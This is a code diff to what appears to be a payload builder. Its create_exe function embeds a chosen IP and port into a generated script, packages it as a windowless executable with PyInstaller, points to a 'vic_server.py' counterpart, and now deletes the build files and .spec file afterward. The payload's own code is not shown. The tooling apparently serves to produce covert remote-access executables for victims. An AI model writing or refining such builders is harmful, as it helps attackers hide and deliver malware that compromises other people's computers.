@@ -1,4 +1,6 @@
 import os
+import shutil
+
 
 GREEN = "\033[0;32m"
 RESET = "\033[0m"
@@ -20,11 +22,24 @@ def create_exe(ip, port, name):
     print(f"[+] Created {script_name} with IP {ip} and Port {port}")
 
     # Generate EXE 
-    result = os.system(f'pyinstaller --onefile --icon=nul --noconsole {script_name}')
+    result = os.system(f'pyinstaller --onefile --noconsole {script_name}')
 
     if result != 0:
         print("[-] PyInstaller encountered an error. Try running manually:")
-        print(f'pyinstaller --onefile -i "NONE" --noconsole {script_name}')
+        print(f'pyinstaller --onefile --noconsole {script_name}')
     else:
         print(f"{GREEN}[+] For a .py file, you can use vic_server.py.{RESET}")
         print(f"{GREEN}[+] EXE generated in 'dist/' folder.{RESET}")
+
+
+        try:
+            if os.path.exists("build"):
+                shutil.rmtree("build")  # Remove 'build/' directory
+
+            spec_file = script_name.replace(".py", ".spec")
+            if os.path.exists(spec_file):
+                os.remove(spec_file)  # Remove the .spec file
+
+            print(f"{GREEN}[+] Cleaned up build files and spec file.{RESET}")
+        except Exception as e:
+            print(f"[-] Error during cleanup: {e}")
